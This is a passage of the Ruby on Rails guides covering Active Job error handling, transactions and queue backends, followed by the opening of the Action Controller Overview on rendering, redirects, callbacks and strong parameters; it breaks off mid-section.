Active Job handles internally by making `perform_later` return `false`. The
practical consequence is that errors become harder to handle for jobs enqueued
by Rails internals or third-party gems like `Turbo::Streams::BroadcastJob`,
since you don't control the call to `perform_later` in those cases. For
recurring tasks, enqueue errors are logged but not raised. See [Errors When
Enqueuing](https://github.com/rails/solid_queue?tab=readme-ov-file#errors-when-enqueuing)
in the Solid Queue documentation for more detail.

If a worker process is killed unexpectedly — for example, with a `KILL` signal —
any in-flight jobs are marked as failed, and errors such as
`SolidQueue::Processes::ProcessExitError` or
`SolidQueue::Processes::ProcessPrunedError` are raised. Heartbeat settings
control how quickly Solid Queue detects and cleans up expired processes. See
[Threads, Processes and
Signals](https://github.com/rails/solid_queue?tab=readme-ov-file#threads-processes-and-signals)
in the Solid Queue documentation for details on configuring this behavior.

If your error tracking service doesn't automatically capture job errors, you can
hook into Active Job's `rescue_from` in `ApplicationJob`:

```ruby
class ApplicationJob < ActiveJob::Base
  rescue_from(Exception) do |exception|
    Rails.error.report(exception)
    raise exception
  end
end
```

If your application uses Action Mailer, note that mailer delivery runs through
`ActionMailer::MailDeliveryJob`, which inherits from `ApplicationJob` but needs
to be handled separately:

```ruby
class ApplicationMailer < ActionMailer::Base
  ActionMailer::MailDeliveryJob.rescue_from(Exception) do |exception|
    Rails.error.report(exception)
    raise exception
  end
end
```

### Transactional Integrity on Jobs

Since Solid Queue can use the same database as your application, it can
participate in the same ACID transactions as your application data. But this
behavior comes with important nuances worth understanding before you rely on it.

When Solid Queue uses the same database as your application, job enqueuing
happens inside the same transaction as any surrounding Active Record operations.
This means a job won't be enqueued if the transaction rolls back, and the
transaction won't commit unless the job enqueue also succeeds. This eliminates a
class of race conditions common with Redis backends (e.g. a job running before
the record it needs has been committed to the database).

However, Rails 8 configures Solid Queue on a *separate database by default*,
precisely to avoid implicit coupling to this behavior. If you build logic that
depends on transactional integrity and later move Solid Queue to its own
database or switch to a different backend, that behavior silently disappears.
The separate database default is the safer choice for most applications.

#### Using `enqueue_after_transaction_commit`

The recommended way to get transactional safety — without depending on both your
app and Solid Queue sharing the same database — is to use
`enqueue_after_transaction_commit`. This defers job enqueuing until the
surrounding Active Record transaction successfully commits, and can be enabled
per job or globally:

```ruby
class ApplicationJob < ActiveJob::Base
  self.enqueue_after_transaction_commit = true
end
```

With this setting, a job enqueued inside a transaction that rolls back will
simply not be enqueued. This gives you the guarantee portably, regardless of
whether Solid Queue shares a database with your app or not.

#### Enqueuing from `after_commit` Callbacks

If you prefer not to use `enqueue_after_transaction_commit`, the alternative is
to always enqueue jobs from `after_commit` callbacks rather than from within
transactions directly:

```ruby
after_commit :schedule_cleanup, on: :create

def schedule_cleanup
  GuestsCleanupJob.perform_later(self)
end
```

This ensures the job is only enqueued once the relevant data is durably
committed to the database.

#### The Risk of Implicit Reliance

The subtle danger is enqueuing a job inside a transaction without either of the
above safeguards in place. In that case, the job may run before the data it
needs is visible to other connections, or it may be enqueued even if the
transaction rolls back. This is easy to overlook if you're accustomed to
Redis-backed backends where this problem doesn't arise in the same form. If
you're unsure whether your code relies on transactional integrity, enabling
`enqueue_after_transaction_commit` globally in `ApplicationJob` is the safest
default.

You can read more about [Transactional Integrity in the Solid Queue
documentation](https://github.com/rails/solid_queue?tab=readme-ov-file#jobs-and-transactional-integrity)

### Recurring Tasks

Solid Queue supports recurring tasks, similar to cron jobs. These tasks are
defined in a configuration file (by default, `config/recurring.yml`) and can be
scheduled at specific times. Here's an example of a task configuration:

```yaml
production:
  a_periodic_job:
    class: MyJob
    args: [42, { status: "custom_status" }]
    schedule: every second
  a_cleanup_task:
    command: "DeletedStuff.clear_all"
    schedule: every day at 9am
```

Each task specifies a `class` or `command` and a `schedule` (parsed using
[Fugit](https://github.com/floraison/fugit)). You can also pass arguments to
jobs, such as in the example for `MyJob` where `args` are passed. This can be
passed as a single argument, a hash, or an array of arguments that can also
include keyword arguments as the last element in the array.

You can learn more about [Recurring
Tasks](https://github.com/rails/solid_queue?tab=readme-ov-file#recurring-tasks)
in the Solid Queue documentation.

Alternate Queuing Backends
--------------------------

While Solid Queue is the default queuing backend in Rails, Active Job is
designed to work seamlessly with different queuing backends. Switching to an
alternative backend, such as [Sidekiq](https://github.com/sidekiq/sidekiq),
[GoodJob](https://github.com/bensheldon/good_job), or
[Resque](https://github.com/resque/resque), requires only a configuration change
(typically with no modifications to your job code), along with adding the
queuing backend's adapter to your Gemfile.

Here is a noncomprehensive list of alternate queuing backends and documentation:

- [Sidekiq](https://github.com/mperham/sidekiq/wiki/Active-Job)
- [Resque](https://github.com/resque/resque/wiki/ActiveJob)
- [Sneakers](https://github.com/jondot/sneakers/wiki/How-To:-Rails-Background-Jobs-with-ActiveJob)
- [Queue Classic](https://github.com/QueueClassic/queue_classic#active-job)
- [Delayed Job](https://github.com/collectiveidea/delayed_job#active-job)
- [Que](https://github.com/que-rb/que#additional-rails-specific-setup)
- [Good Job](https://github.com/bensheldon/good_job#readme)

To switch backends globally, you can set `config.active_job.queue_adapter` in
your application configuration:

```ruby
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.active_job.queue_adapter = :sidekiq
  end
end
```

You can also set the adapter per-environment, which is useful if you want to use
Solid Queue in production but a simpler adapter in development:

```ruby
# config/environments/development.rb
config.active_job.queue_adapter = :async
```

If you want to migrate incrementally, you can set the adapter at the job class
level. This is useful for moving one job at a time rather than switching
everything at once:

```ruby
class MyJob < ApplicationJob
  self.queue_adapter = :sidekiq
end
```

Each backend requires its own gem and typically its own process. Once you add
the adapter's gem to your `Gemfile`, you can refer to the adapter's
documentation for any additional setup — most backends require a separate worker
process to be started alongside your Rails application, and some (like Sidekiq)
require additional infrastructure such as Redis.

Note that switching backends doesn't migrate jobs already sitting in the old
queue. You'll need to drain the old queue before switching, or run both backends
in parallel temporarily to let existing jobs complete.

NOTE: The early releases of Active Job had adapters built-in, but a decision was
later made to let queueing backends providers manage the adapter themselves. Any
backend can be used with Active Job regardless of whether the adapter is built
in or not.

TIP: If you use `config.active_job.queue_name_prefix`, make sure your new
backend's worker configuration listens to the prefixed queue names, not the bare
names.

Monitoring and Handling Failed Jobs
-----------------------------------

### Monitoring With Mission Control

The [Mission Control](https://github.com/rails/mission_control-jobs) engine is a
Rails-based frontend to Active Job adapters to help centralize the monitoring
and management of failed jobs. It provides insights into job status, failure
reasons, and retry behaviors, enabling you to track and resolve issues more
effectively.

For instance, if a job fails to process a large file due to a timeout,
`mission_control-jobs` allows you to inspect the failure, review the job’s
arguments and execution history, and decide whether to retry, requeue, or
discard it.

### Detecting Errors With `rescue_from`

Exceptions raised during the execution of the job can be handled with
[`rescue_from`](https://api.rubyonrails.org/classes/ActiveSupport/Rescuable/ClassMethods.html#method-i-rescue_from):

```ruby
class GuestsCleanupJob < ApplicationJob
  queue_as :default

  rescue_from(ActiveRecord::RecordNotFound) do |exception|
    # Do something with the exception
  end

  def perform
    # Do something later
  end
end
```

If an exception from a job is not rescued, then the job is referred to as
"failed".

You can enable additional logging to figure out where jobs are coming from with
[verbose logging](debugging_rails_applications.html#verbose-enqueue-logs).

### Retrying or Discarding Failed Jobs

A failed job will not be retried, unless configured otherwise.

It's possible to either retry or discard a failed job by using [`retry_on`][] or
[`discard_on`][], respectively. For example:

```ruby
class RemoteServiceJob < ApplicationJob
  retry_on CustomAppException # defaults to 3s wait, 5 attempts

  discard_on Net::OpenTimeout

  def perform(*args)
    # Might raise CustomAppException or Net::OpenTimeout
  end
end
```

[`discard_on`]:
    https://api.rubyonrails.org/classes/ActiveJob/Exceptions/ClassMethods.html#method-i-discard_on
[`retry_on`]:
    https://api.rubyonrails.org/classes/ActiveJob/Exceptions/ClassMethods.html#method-i-retry_on

### Missing Records

GlobalID will use the unique identifier to locate the full Active Record object
when calling `#perform`.

If a passed record is deleted after the job is enqueued but before the
`#perform` method is called Active Job will raise an
[`ActiveJob::DeserializationError::RecordNotFound`](https://api.rubyonrails.org/classes/ActiveJob/DeserializationError/RecordNotFound.html)
exception. Jobs whose arguments may legitimately reference deleted records can
discard it:

```ruby
class SearchIndexingJob < ApplicationJob
  discard_on ActiveJob::DeserializationError::RecordNotFound
end
```

Other errors raised while deserializing arguments, including database errors
raised while locating a record, are wrapped in the more general
[`ActiveJob::DeserializationError`](https://api.rubyonrails.org/classes/ActiveJob/DeserializationError.html),
its parent class. Prefer discarding `RecordNotFound`: discarding the parent
class would also discard jobs that failed due to a transient database error,
even though the record may still exist.



<!-- ===== guides/source/action_controller_overview.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Action Controller Overview
==========================

In this guide, you will learn how controllers work and how they fit into the
request cycle in your application.

After reading this guide, you will know how to:

- Follow the flow of a request through a controller.
- Render HTTP responses as well as redirect responses.
- Work with action callbacks to execute code during request processing.
- Access and securely filter parameters passed to your controller.
- Store data in the cookie, the session, and the flash.
- Use the Request and Response Objects.

--------------------------------------------------------------------------------

Action Controller Basics
------------------------

Action Controller is the **C** in the Model View Controller
([MVC](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller))
pattern. The [router](routing.html) matches a controller to an incoming request,
which is responsible for processing the request and generating the response.

For most conventional
[RESTful](https://en.wikipedia.org/wiki/Representational_state_transfer)
applications, the controller will receive the request, fetch or save data from a
model, and render a view to create HTML output.

A controller sits between models and views. The controller makes model data
available to the view, so that the view can display that data to the user. The
controller also receives user input from the view and saves or updates model
data accordingly.

### Structure of a Controller

A controller is a Ruby class which inherits from `ApplicationController` and has
methods just like any other class. Public methods in a controller are also known
as _actions_, as they are responsible for rendering responses.

```ruby
# app/controllers/products_controller.rb

class ProductsController < ApplicationController
  def index
  end
end
```

As per Rails conventions, controllers should define up to 7 conventional CRUD
actions as demonstrated below. This convention is used by the
[Router DSL](routing.html#crud-verbs-and-actions) to configure resourceful
routes to the controller. Other actions may be defined and routed to, but these
are outside Rails conventions. Further details are available in the
[Routing guide](routing.html).

```ruby
# config/routes.rb

Rails.application.routes.draw do
  # A resourceful route to the `ProductsController`
  resources :products
end
```

```ruby
# app/controllers/products_controller.rb

class ProductsController < ApplicationController
  # GET /products
  def index
    # Display all products
  end

  # GET /products/new
  def new
    # Render a form to create a new product
  end

  # POST /products
  def create
    # Handle the submission form rendered in `new`
    # and create the product in the database
  end

  # GET /products/:id
  def show
    # Show the product
  end

  # GET /products/:id/edit
  def edit
    # Render a form to edit the product
  end

  # PATCH /products/:id
  def update
    # Handle the submission form rendered in `edit`
    # and update the product in the database
  end

  # DELETE /product/:id
  def destroy
    # Delete the product
  end
end
```

Once the [router matches](routing.html) an incoming request to a controller and
action, Rails creates an instance of that controller class and calls the method
with the same name as the action.

NOTE: The `new` method in the above controller is an instance method, called on
an instance of `ProductsController`. This should not be confused with the `new`
class method used to instantiate objects (`ProductsController.new`).

### Naming Conventions

Rails favors pluralizing the resource in the controller's name. For example,
`ProductsController` is preferred over `ProductController` and
`SiteAdminsController` over `SiteAdminController` or `SitesAdminsController`.
However, the plural names are not strictly required — for example,
`ApplicationController`.

Following this naming convention will allow you to use
[resourceful routes](routing.html#crud-verbs-and-actions) without needing to
qualify each with
[additional options](routing.html#specifying-a-controller-to-use). The
convention also makes named route helpers consistent throughout your
application.

The controller naming convention is different from models. While plural names
are preferred for controller names, the singular form is preferred for
[model names](active_record_basics.html#naming-conventions) (e.g. `Account` vs.
`Accounts`).

Controller actions should be _public_, as only _public_ methods are callable as
actions. Helper methods within controllers which are _not_ intended to be
actions should be declared `private` or `protected`.

WARNING: Ensure that you do not override methods defined by
`ActionController::Base` when creating actions. Accidentally redefining them
could result in `SystemStackError`. If you limit your controllers to the 7 CRUD
actions, this won't be an issue.

NOTE: If you must use a reserved method as an action name, one workaround is to
use a custom route to map the reserved method name to your non-reserved action
method.

### Rendering Responses

Consider the below route and controller.

```ruby
# config/routes.rb

Rails.application.routes.draw do
  # A resourceful route to the `ProductsController`
  resources :products
end
```

```ruby
class ProductsController < ApplicationController
  def index
  end
end
```

When a user navigates to `/products`, Rails will create an instance of
`ProductsController` and call its `index` method. If the `index` method is
empty, Rails will automatically render `app/views/products/index.html.erb`.

You can explicity define the template to render using the `render` method:

```ruby
class ProductsController < ApplicationController
  def index
    # Renders `app/views/products/feed.html.erb`
    render "feed"
  end
end
```

WARNING: Calling `render` does not `return` from the current scope. Statements
after the method call will still be executed. Ensure you do not call `render`
more than once in any given action, as it will raise an
`AbstractController::DoubleRenderError`.

To enable rendering of additional formats, not just HTML, use a `respond_to`
block. This will choose the correct template based on the `Accept` header in the
HTTP request:

```ruby
class ProductsController < ApplicationController
  def index
    respond_to do |format|
      format.html   # renders `app/views/products/index.html.erb`
      format.xml    # renders `app/views/products/index.xml.erb`
    end
  end
end
```

See the
[Layouts and Rendering guide](layouts_and_rendering.html#rendering-responses)
for futher details on rendering responses.

In the `index` method, the controller would typically create an array of the
`Product` model instances, and make it available as an instance variable called
`@products` in the view:

```ruby
def index
  @products = Product.all
end
```

NOTE: All controllers inherit from `ApplicationController`, which in turn
inherits from
[`ActionController::Base`](https://api.rubyonrails.org/classes/ActionController/Base.html).
For [API only](https://guides.rubyonrails.org/api_app.html) applications
`ApplicationController` inherits from
[`ActionController::API`](https://edgeapi.rubyonrails.org/classes/ActionController/API.html).

### Redirecting Requests

Instead of rendering a fully-formed response, such as an HTML document, you
might want to redirect the user to a different path. An
[HTTP redirection status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status#redirection_messages)
can be used for this. Rails' [`redirect_to`][] method uses `302 Found` by
default.

```ruby
redirect_to photos_url
```

This will send a `302` HTTP response to the browser with `photos_url` in the
`Location` header. The browser will then make a new `GET` request to the
`photos_url`.

```http
HTTP/1.1 302 Found
referrer-policy: strict-origin-when-cross-origin
location: http://localhost:3000/photos
content-type: text/html; charset=utf-8
cache-control: no-cache
connection: close
content-length: 0
```

NOTE: It's worth being aware that `redirect_to` doesn't move execution to a
different method within the same request. It sends an HTTP response and then the
browser makes a new request to the redirected location which won't have any
context from the previous request.

Alternatively, you can use [`redirect_back`][] to return the user to the page
they just came from. The location is pulled from the `HTTP_REFERER` header which
is not guaranteed to be set by the browser, so you must provide a
`fallback_location`.

```ruby
redirect_back(fallback_location: root_path)
# or
redirect_back_or_to root_path
```

WARNING: Similar to `render`, `redirect_to` and `redirect_back` do not
automatically `return` from the current scope, instead they simply set the HTTP
response. Statements occurring after them will still be executed.

[`redirect_to`]:
  https://api.rubyonrails.org/classes/ActionController/Redirecting.html#method-i-redirect_to
[`redirect_back`]:
  https://api.rubyonrails.org/classes/ActionController/Redirecting.html#method-i-redirect_back

Use the [`status:`](layouts_and_rendering.html#status) option to use a different
HTTP response code. Both numeric and symbolic values are valid.

```ruby
redirect_to photos_path, status: :see_other
```

NOTE: When redirecting using `302 Found`, the client may not always make a `GET`
request to the `Location`. JavaScript's `fetch` method will make a `GET` request
after redirection from a `GET` or `POST` request. But, if the initial request is
another method, for example `PUT`, it will use the same method when requesting
the redirected location. This is not a problem in Rails because all
[form submissions use `POST`](https://guides.rubyonrails.org/form_helpers.html#forms-with-patch-put-or-delete-methods),
even when using [Turbo](http://turbo.hotwired.dev). <br><br> When making
requests in custom JavaScript, redirect using
[`303 See Other`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/303)
to ensure a `GET` request to the redirected location, or
[`307 Temporary Redirect`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/307)
to preserve the original HTTP verb.

### Header-Only Responses

The [`head`][] method can be used to send responses with only headers to the
browser. This is usually in response to an
[HTTP `HEAD`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods/HEAD)
request.

The `head` method accepts a number or symbol representing an HTTP status code.

```ruby
head :bad_request
# or
head 400
```

This would produce the following HTTP response:

```http
HTTP/1.1 400 Bad Request
connection: close
transfer-encoding: chunked
content-type: text/html; charset=utf-8
set-cookie: _blog_session=...snip...; path=/; HttpOnly
cache-control: no-cache
```

You can add additional HTTP headers if you wish.

```ruby
head :created, location: photo_path(@photo)
```

Which would produce:

```http
HTTP/1.1 201 Created
connection: close
transfer-encoding: chunked
location: /photos/1
content-type: text/html; charset=utf-8
set-cookie: _blog_session=...snip...; path=/; HttpOnly
cache-control: no-cache
```

[`head`]:
  https://api.rubyonrails.org/classes/ActionController/Head.html#method-i-head

Controller Callbacks
--------------------

Controller callbacks are methods that are defined to automatically run before or
after a controller action. Callbacks may be defined in the
`ApplicationController` if they need to be run across the application, or within
specific controllers only.

### `before_action`

Callback methods registered via [`before_action`][] run _before_ a controller
action. They may halt the request cycle meaning the controller action itself is
never called.

A common use case for `before_action` is to ensure that a user is logged in:

```ruby
class ApplicationController < ActionController::Base
  before_action :require_login

  private
    def require_login
      unless Current.user.present?
        redirect_to new_login_url # halts request cycle
      end
    end
end
```

When a `before_action` callback renders or redirects (like in the example
above), the controller action is not run. If there are additional callbacks
registered to run, they will be cancelled.

In this example, the `before_action` is defined in `ApplicationController`
meaning it will be run before all actions across the applications. This also
means the user will need to be logged into access the login page, which doesn't
make sense.

In such cases, use [`skip_before_action`][] to allow specified controller
actions to skip a given `before_action`:

```ruby
class SessionsController < ApplicationController
  skip_before_action :require_login, only: [:new, :create]
end
```

Now, the `SessionsController`'s `new` and `create` actions will work without
requiring the user to be logged in.

The `:only` option skips the callback only for the listed actions. There is also
an `:except` option which works the other way. These options can be used when
registering action callbacks to run them only for specific actions.

NOTE: If you register the same action callback multiple times with different
options, the last action callback definition will overwrite the previous ones.

[`before_action`]:
  https://api.rubyonrails.org/classes/AbstractController/Callbacks/ClassMethods.html#method-i-before_action
[`skip_before_action`]:
  https://api.rubyonrails.org/classes/AbstractController/Callbacks/ClassMethods.html#method-i-skip_before_action

### `after_action` and `around_action`

You can also define action callbacks to run _after_ a controller action has been
executed with [`after_action`][], or to run both before and after with
[`around_action`][].

The `after_action` callbacks are similar to `before_action` callbacks, but
because the controller action has already been run they have access to the
response data that's about to be sent to the client.

NOTE: `after_action` callbacks are executed only after a successful controller
action, and not if an exception is raised in the request cycle.

The `around_action` callbacks are useful when you want to execute code before
and after a controller action, allowing you to encapsulate functionality that
affects the action's execution. They are responsible for running their
associated actions by `yield`ing.

For example, imagine you want to monitor the performance of specific actions.
You could use an `around_action` to measure how long each action takes to
complete and log this information:

```ruby
class ApplicationController < ActionController::Base
  around_action :measure_execution_time

  private
    def measure_execution_time
      start_time = Time.now
      yield  # This executes the action
      end_time = Time.now

      duration = end_time - start_time
      Rails.logger.info "Action #{action_name} from controller #{controller_name} took #{duration.round(2)} seconds to execute."
    end
end
```

TIP: Action callbacks receive `controller_name` and `action_name` as parameters
you can use, as shown in the example above.

The `around_action` callback also wraps rendering. In the example above, view
rendering will be included in the `duration`. The code after the `yield` in an
`around_action` is run even when there is an exception in the associated action
and there is an `ensure` block in the callback.

This is different from `after_action` callbacks where an exception in the action
cancels any `after_action` callbacks.

[`after_action`]:
  https://api.rubyonrails.org/classes/AbstractController/Callbacks/ClassMethods.html#method-i-after_action
[`around_action`]:
  https://api.rubyonrails.org/classes/AbstractController/Callbacks/ClassMethods.html#method-i-around_action

### Advanced Techniques to Register Callbacks

In addition to registering a method name using `before_action`, `after_action`,
or `around_action`, there are two other ways to register callbacks.

#### Using a Block

A block can be supplied to the `*_action` methods. It receives the controller as
an argument. The `require_login` action callback from above could be rewritten
to use a block:

```ruby
class ApplicationController < ActionController::Base
  before_action do |controller|
    unless Current.user.present?
      redirect_to new_login_url
    end
  end
end
```

Specifically for `around_action`, the block also yields in the `action`:

```ruby
around_action { |_controller, action| time(&action) }
```

#### Using an Object

An object, usually a class, can be used to register callbacks. The object must
implement a method with the same name as the action callback.

For the `before_action` callback, the class must implement a `before` method,
and so on. Also, the `around` method must `yield` to execute the action.

This can be useful in cases that are more complex. As an example, you could
rewrite the `around_action` callback to measure execution time with a class:

```ruby
class ApplicationController < ActionController::Base
  around_action ActionDurationCallback
end

class ActionDurationCallback
  def self.around(controller)
    start_time = Time.now
    yield # This executes the action
    end_time = Time.now

    duration = end_time - start_time
    Rails.logger.info "Action #{controller.action_name} from controller #{controller.controller_name} took #{duration.round(2)} seconds to execute."
  end
end
```

In the above example, the `ActionDurationCallback`'s method is not run in the
scope of the controller but gets `controller` as an argument.

Request Parameters
------------------

Data sent by the incoming request is available in your controller using the
[`params`][] method which returns an [`ActionController::Parameters`][] object.

There are two types of parameter data:

- Query string parameters which are sent as part of the URL (for example, after
  the `?` in `http://example.com/accounts?filter=free`).
- Request body parameters in non-`GET` requests, usually from an HTML form.

Rails does not make a distinction between query string parameters and request
body parameters — both are available in the `params` object in your controller.
For example:

```ruby
class ProductsController < ApplicationController
  # This action receives query string parameters from an HTTP GET request
  # at the URL "/products?filter=books"
  def index
    if params[:filter] == "books"
      @products = Product.books
    else
      @products = Product.all
    end
  end

  # This action receives parameters from a POST request to "/products" URL with
  # form data in the request body.
  def create
    @product = Product.new(params[:product])
    if @product.save
      redirect_to @product
    else
      render "new", status: :unprocessable_content
    end
  end
end
```

NOTE: [`ActionController::Parameters`][] does not inherit from Hash, but it is
mostly similar in behavior. Unlike a Hash, symbolic and string keys, such as
`:foo` and `"foo"`, are considered to be the same.

[`params`]:
  https://api.rubyonrails.org/classes/ActionController/StrongParameters.html#method-i-params
[`ActionController::Parameters`]:
  https://api.rubyonrails.org/classes/ActionController/Parameters.html

### Parameter Value Types

Values in an [`ActionController::Parameters`][] object must be a permitted
scalar value defined in `ActionController::Parameters::PERMITTED_SCALAR_TYPES`.

```ruby
ActionController::Parameters::PERMITTED_SCALAR_TYPES
# => [String, Symbol, NilClass, Numeric, TrueClass, FalseClass, Date, Time, StringIO, IO, ActionDispatch::Http::UploadedFile, Rack::Test::UploadedFile]
```

The object can contain nested hashes and arrays, but values within those must
also contain a permitted scalar.

To send an array of values, append an empty pair of square brackets `[]` to the
key name:

```
GET /users?ids[]=1&ids[]=2&ids[]=3
```

NOTE: The actual URL in this example will be encoded as
`/users?ids%5b%5d=1&ids%5b%5d=2&ids%5b%5d=3` as the `[` and `]` characters are
not allowed in URLs. Most of the time you don't have to worry about this because
the browser will encode it for you, and Rails will decode it automatically, but
if you ever find yourself having to send those requests to the server manually
you should keep this in mind.

The value of `params[:ids]` will be the array `["1", "2", "3"]`. Parameter
values are always strings, Rails does not attempt to guess or cast the type.

NOTE: Values such as `[nil]` or `[nil, nil, ...]` in `params` are replaced with
`[]` for security reasons by default. See
[Security Guide](security.html#unsafe-query-generation) for more information.

To send a hash, you include the key name inside the brackets:

```html
<form accept-charset="UTF-8" action="/users" method="post">
  <input type="text" name="user[name]" value="Acme" />
  <input type="text" name="user[phone]" value="12345" />
  <input type="text" name="user[address][postcode]" value="12345" />
  <input type="text" name="user[address][city]" value="Carrot City" />
</form>
```

When this form is submitted, the value of `params[:user]` will be:

```ruby
{
  "name" => "Acme",
  "phone" => "12345",
  "address" => {
    "postcode" => "12345",
    "city" => "Carrot City"
  }
}
```

Note the nested hash in `params[:user][:address]`.

Rails provides helpers to construct HTML forms that adhere to Rails conventions.
Refer to the [Form Helpers guide](form_helpers.html) for further information.

### Composite Key Parameters

[Composite key parameters](active_record_composite_primary_keys.html) contain
multiple values in one parameter separated by a delimiter (such as an
underscore). Therefore, you will need to extract each value so that you can pass
them to Active Record. You can use the [`extract_value`][] method to do that.

Consider the below controller and route:

```ruby#4
class ProductsController < ApplicationController
  def show
    # Extract the composite ID value from URL parameters.
    id = params.extract_value(:id)
    @product = Product.find(id)
  end
end
```

```ruby
get "/products/:id", to: "products#show"
```

When a user requests the URL `/products/4_2`, the controller will extract the
composite key value `["4", "2"]` and pass it to `Product.find`. The
[`extract_value`][] method may be used to extract arrays out of any delimited
parameters.

[`extract_value`]:
  https://api.rubyonrails.org/classes/ActionController/Parameters.html#method-i-extract_value

### JSON Parameters

If your application exposes an API, you will likely accept parameters in JSON
format. If the `content-type` header of your request is set to
`application/json`, Rails will automatically load your parameters into the
`params` hash, which you can access as you would normally.

So for example, if you are sending this JSON content:

```json
{ "user": { "name": "acme", "address": "123 Carrot Street" } }
```

Your controller will receive:

```ruby
{ "user" => { "name" => "acme", "address" => "123 Carrot Street" } }
```

#### Parameter Wrapping

Rails will automatically wrap parameters within a key denoting the corresponding
resource, and also add the controller name to JSON parameters.

For example, consider the below JSON object:

```json
{ "name": "acme", "address": "123 Carrot Street" }
```

If we send the above data to `create` action of the `UsersController`, the JSON
data will be wrapped within the `:user` key as:

```ruby
{
  controller: "users",
  action: "create",
  name: "acme",
  address: "123 Carrot Street",
  user: {
    name: "acme", address: "123 Carrot Street"
  }
}
```

NOTE: Rails adds a clone of the parameters to the hash within the key
corresponding to the resource's name. As a result, both the original version of
the parameters and the "wrapped" version of the parameters will exist in the
params object.

NOTE: While the action and controller names are available in the params object,
it is recommended to use the methods [`controller_name`][] and [`action_name`][]
instead to access these values.

Parameter wrapping is enabled by default, but can be disabled using a
configuration option:

```ruby
# config/application.rb

config.action_controller.wrap_parameters_by_default = false
```

You can also customize the name of the key or specific parameters you want to
wrap, see the
[API documentation](https://api.rubyonrails.org/classes/ActionController/ParamsWrapper.html)
for more.

[`controller_name`]:
  https://api.rubyonrails.org/classes/ActionController/Metal.html#method-i-controller_name
[`action_name`]:
  https://api.rubyonrails.org/classes/AbstractController/Base.html#method-i-action_name

### Routing Parameters

Parameters specified as part of a route declaration in the `routes.rb` file are
also made available in the `params` hash. For example, we can add a route that
captures the `:category` parameter for a product:

```ruby
get "/products/:category", to: "products#index", foo: "bar"
```

When a user navigates to `/products/electronics` URL, `params[:category]` will
be set to "electronics". When this route is used, `params[:foo]` will also be
set to "bar", as if it were passed in the query string.

Any other parameters defined by the route declaration, such as `:id`, will also
be available.

### Global Default Parameters

You can set global default parameters when generating URLs by defining a
`default_url_options` method in your controller.

```ruby
class ApplicationController < ActionController::Base
  def default_url_options
    { locale: I18n.locale }
  end
end
```

The specified defaults will be used as a starting point when generating URLs.
They can be overridden by the options passed to [`url_for`][] or any path helper
such as `products_path`. The above example will automatically add the locale to
every URL.

```ruby
products_path # => "/products?locale=en"
```

You can still override this default if needed:

```ruby
products_path(locale: :fr) # => "/products?locale=fr"
```

NOTE: All Rails path helpers call `url_for` under the hood.

If you define `default_url_options` in `ApplicationController`, as in the
example above, these defaults will be used for all URL generation. The method
can also be defined in a specific controller, in which case it only applies to
URLs generated for that controller.

In a given request, the method is not actually called for every single generated
URL. For performance reasons the returned hash is cached per request.

[`url_for`]:
  https://api.rubyonrails.org/classes/ActionView/RoutingUrlFor.html#method-i-url_for

### Securing Submitted Parameters

[Action Controller Strong Parameters](https://api.rubyonrails.org/classes/ActionController/StrongParameters.html)
ensures parameters cannot be used in Active Model mass assignments until they
have been explicitly permitted.

This requires you to specify the allowed attributes for any given model and
declare them in the controller. This is a security practice to prevent users
from accidentally or maliciously updating sensitive model attributes.

Consider the below controller and action:

```ruby
class PeopleController < ActionController::Base
  def create
    @person = Person.create(params[:person])
    # ...
  end
end
```

We create a `Person` record using the parameters passed in the `:person` key,
without explicitly defining which parameters are permitted. A `Person` may have
a boolean attribute which specifies whether or not they're an _admin_. A
malicious user could modify the HTML form to send this value and make themselves
an admin without permission. As such, all parameters used in mass assignment
must be explicitly allowed, and the above example will raise a
`ActiveModel::ForbiddenAttributesError`.

#### Permitting Parameter Attributes

Each attribute must be manually permitted using its key. Nested hashes and
arrays within attributes are allowed, and depending on the method used, nested
keys may also need to be specified.

The [`expect`][], [`permit`][], and [`require`][] methods are commonly used to
specify permitted attributes.

##### `expect`

The [`expect`][] method is the safest and most explicit way to permit
parameters. If the request doesn't contain all expected parameters,
`ActionController::ParameterMissing` will be raised and a `400 Bad Request` HTTP
response will be returned.

```ruby#5
class UsersController < ApplicationController
  # ...

  def update
    id = params.expect(:id)
  end

  # ...
end
```

When handling Rails forms, use [`expect`][] to ensure that the root key is
present and define the permitted attributes.

```ruby#5
class UsersController < ApplicationController
  # ...
  private
    def user_params
      params.expect(user: [:username, :password])
    end
end
```

[`expect`][] is strict with types. Supplying a single key will return a scalar,
and multiple keys will return an array of those values.

```ruby
params = ActionController::Parameters.new(name: "John Doe")
params.expect(:name)
# => "John Doe"

params = ActionController::Parameters.new(name: "John Doe", title: "Mr")
params.expect(:name, :title)
# => ["John Doe", "Mr"]
```

Nested hashes and arrays must be specified, including any nested keys, or they
will be filtered out.

```ruby
params = ActionController::Parameters.new(user: { name: "John Doe" })
params.expect(:user)
# => param is missing or the value is empty or invalid: user (ActionController::ParameterMissing)
params.expect(user: [:name])
# => #<ActionController::Parameters {"name" => "John Doe"} permitted: true>

params = ActionController::Parameters.new(ids: ["1", "2", "3"])
params.expect(:ids)
# => param is missing or the value is empty or invalid: ids (ActionController::ParameterMissing)
params.expect(ids: [])
# => ["1", "2", "3"]

params = ActionController::Parameters.new(
  users: [{ name: "John Doe" }, { name: "Jane Doe" }]
)
params.expect(users: [])
# => param is missing or the value is empty or invalid: users (ActionController::ParameterMissing)
params.expect(users: [:name])
# => param is missing or the value is empty or invalid: users (ActionController::ParameterMissing)
params.expect(users: [[:name]])
# => [#<ActionController::Parameters {"name" => "John Doe"} permitted: true>, #<ActionController::Parameters {"name" => "Jane Doe"} permitted: true>]
```

Permit all attributes under a key using:

```ruby
params.expect(user: {})
```

This does not check for types or any nested types. All contained attributes are
permitted, which somewhat bypasses the security aspects of strong parameters.

WARNING: Extreme care should be taken when calling `expect` with an empty hash,
as it will allow all current and future model attributes to be mass-assigned.

[`expect`]:
  https://api.rubyonrails.org/classes/ActionController/Parameters.html#method-i-expect

##### `permit` and `require`

[`permit`][] returns a new `ActionController::Parameters` object containing only
the permitted attributes. Disallowed attributes are filtered out, and no error
is raised.

```ruby
